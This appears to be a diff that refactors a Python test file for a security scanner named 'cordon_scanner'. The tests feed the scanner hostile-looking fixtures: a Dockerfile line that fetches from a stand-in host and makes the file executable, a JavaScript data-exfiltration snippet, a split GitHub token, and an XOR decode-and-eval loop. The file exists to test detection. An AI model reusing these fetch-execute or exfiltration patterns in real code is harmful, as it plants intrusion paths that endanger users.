@@ -19,12 +19,16 @@ from cordon_scanner.core.models import Category
 from support import Support
 
 
-def flagged(root) -> set[str]:
-    return {
-        f.rule_id
-        for f in Scanner().scan(root).findings
-        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
-    }
+class OrdinaryFormattingHelpers:
+    """Helpers for test_ordinary_formatting.py."""
+
+    @staticmethod
+    def flagged(root) -> set[str]:
+        return {
+            f.rule_id
+            for f in Scanner().scan(root).findings
+            if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
+        }
 
 
 class TestAlignedAssignment:
@@ -41,7 +45,7 @@ class TestAlignedAssignment:
             "}\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" in flagged(tmp_path)
+        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" in OrdinaryFormattingHelpers.flagged(tmp_path)
 
     def test_aligned_kubernetes_rbac_wildcard(self, tmp_path) -> None:
         (tmp_path / "role.yaml").write_text(
@@ -54,7 +58,7 @@ class TestAlignedAssignment:
             '    verbs:          ["*"]\n',
             encoding="utf-8",
         )
-        assert "SUSPECT.K8S.RBAC_WILDCARD.001" in flagged(tmp_path)
+        assert "SUSPECT.K8S.RBAC_WILDCARD.001" in OrdinaryFormattingHelpers.flagged(tmp_path)
 
     def test_alignment_does_not_make_a_safe_value_unsafe(self, tmp_path) -> None:
         (tmp_path / "main.tf").write_text(
@@ -64,7 +68,7 @@ class TestAlignedAssignment:
             "}\n",
             encoding="utf-8",
         )
-        assert flagged(tmp_path) == set()
+        assert OrdinaryFormattingHelpers.flagged(tmp_path) == set()
 
     def test_the_gap_does_not_cross_a_newline(self, tmp_path) -> None:
         """Widening the bound must not let a key on one line pair with a value
@@ -75,7 +79,7 @@ class TestAlignedAssignment:
             'output "note" {\n  value = "0.0.0.0/0 is not used here"\n}\n',
             encoding="utf-8",
         )
-        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" not in flagged(tmp_path)
+        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" not in OrdinaryFormattingHelpers.flagged(tmp_path)
 
 
 class TestLineContinuations:
@@ -92,7 +96,7 @@ class TestLineContinuations:
             " && /usr/bin/agent --register\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.CONTAINER.FETCH_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.CONTAINER.FETCH_EXEC.001" in OrdinaryFormattingHelpers.flagged(tmp_path)
 
     def test_a_numeric_mode_counts_as_making_it_executable(self, tmp_path) -> None:
         """`chmod 755` and `chmod +x` do the same thing."""
@@ -100,7 +104,7 @@ class TestLineContinuations:
             "FROM alpine\nRUN curl -sSL https://x.invalid/a -o /tmp/a && chmod 700 /tmp/a\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.CONTAINER.FETCH_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.CONTAINER.FETCH_EXEC.001" in OrdinaryFormattingHelpers.flagged(tmp_path)
 
     def test_an_ordinary_dockerfile_with_curl_and_chmod_stays_clean(self, tmp_path) -> None:
         """Both verbs are present and unrelated: curl is installed, and a file
@@ -114,7 +118,7 @@ class TestLineContinuations:
             "USER nobody\n",
             encoding="utf-8",
         )
-        assert flagged(tmp_path) == set()
+        assert OrdinaryFormattingHelpers.flagged(tmp_path) == set()
 
 
 class TestImplicitConcatenation:
@@ -126,7 +130,7 @@ class TestImplicitConcatenation:
         (tmp_path / "conf.py").write_text(
             f'TOKEN = ("{token[:4]}" "{token[4:]}")\n', encoding="utf-8"
         )
-        assert "SECRET.GITHUB.TOKEN.001" in flagged(tmp_path)
+        assert "SECRET.GITHUB.TOKEN.001" in OrdinaryFormattingHelpers.flagged(tmp_path)
 
     def test_an_ordinary_long_url_constant_is_not_a_secret(self, tmp_path) -> None:
         """Reading every constant is what implicit concatenation requires, and
@@ -140,11 +144,11 @@ class TestImplicitConcatenation:
             ")\n",
             encoding="utf-8",
         )
-        assert flagged(tmp_path) == set()
+        assert OrdinaryFormattingHelpers.flagged(tmp_path) == set()
 
     def test_a_low_entropy_adjacency_is_not_a_secret(self, tmp_path) -> None:
         (tmp_path / "const.py").write_text('PREFIX = ("cordon" "-" "scanner")\n', encoding="utf-8")
-        assert flagged(tmp_path) == set()
+        assert OrdinaryFormattingHelpers.flagged(tmp_path) == set()
 
 
 class TestValueShapesInOtherLanguages:
@@ -159,7 +163,7 @@ class TestValueShapesInOtherLanguages:
             "req.end(JSON.stringify(all));\n",
             encoding="utf-8",
         )
-        assert "SUSPECT.EXFIL.DROP_POINT.001" in flagged(tmp_path)
+        assert "SUSPECT.EXFIL.DROP_POINT.001" in OrdinaryFormattingHelpers.flagged(tmp_path)
 
     def test_a_notifier_that_does_not_read_the_environment_stays_clean(self, tmp_path) -> None:
         (tmp_path / "index.js").write_text(
@@ -170,7 +174,7 @@ class TestValueShapesInOtherLanguages:
             "req.end(JSON.stringify({ text: `up on ${PORT} in ${NODE_ENV}` }));\n",
             encoding="utf-8",
         )
-        assert flagged(tmp_path) == set()
+        assert OrdinaryFormattingHelpers.flagged(tmp_path) == set()
 
     def test_xor_written_as_an_append_loop(self, tmp_path) -> None:
         """The loop form is more common in real samples than the comprehension,
@@ -185,7 +189,7 @@ class TestValueShapesInOtherLanguages:
             + Support.assemble("ev", "al(comp", "ile(out.decode(), '<s>', 'exec'))\n"),
             encoding="utf-8",
         )
-        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" in OrdinaryFormattingHelpers.flagged(tmp_path)
 
     def test_an_ordinary_append_and_an_ordinary_xor_stay_clean(self, tmp_path) -> None:
         (tmp_path / "util.py").write_text(
@@ -199,4 +203,4 @@ class TestValueShapesInOtherLanguages:
             "    return out\n",
             encoding="utf-8",
         )
-        assert flagged(tmp_path) == set()
+        assert OrdinaryFormattingHelpers.flagged(tmp_path) == set()
